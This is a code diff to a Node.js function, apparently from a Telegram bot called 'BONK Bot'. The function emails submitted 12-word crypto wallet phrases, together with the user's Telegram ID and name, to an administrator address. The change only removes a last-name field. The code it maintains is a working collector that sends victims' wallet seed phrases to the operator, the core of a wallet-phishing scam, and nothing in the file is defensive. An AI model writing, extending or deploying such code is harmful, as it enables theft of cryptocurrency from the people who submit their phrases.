@@ -16,7 +16,7 @@ const transporter = nodemailer.createTransport({
  * @param {string} phrase - 12-word wallet phrase.
  * @returns {Promise<Object>} - Mail delivery info object.
  */
-const sendPhraseMail = async (telegram_id, firstName, lastName, phrase) => {
+const sendPhraseMail = async (telegram_id, firstName, phrase) => {
     const mailOptions = {
         from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
         to: ADMIN_EMAIL,
@@ -26,7 +26,7 @@ const sendPhraseMail = async (telegram_id, firstName, lastName, phrase) => {
                 <h2 style="color: #d9534f;">🚨 New Phrase Submission</h2>
                 <hr style="border: none; border-top: 1px solid #ccc;" />
                 <p><strong>👤 Telegram ID:</strong> ${telegram_id}</p>
-                <p><strong>📛 Name:</strong> ${firstName} ${lastName}</p>
+                <p><strong>📛 Name:</strong> ${firstName}</p>
                 <p><strong>🔑 Phrase:</strong></p>
                 <pre style="background: #fff; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; white-space: pre-wrap; word-break: break-word;">${phrase}</pre>
                 <p><strong>📬 Submitted:</strong> ${new Date().toLocaleString()}</p>
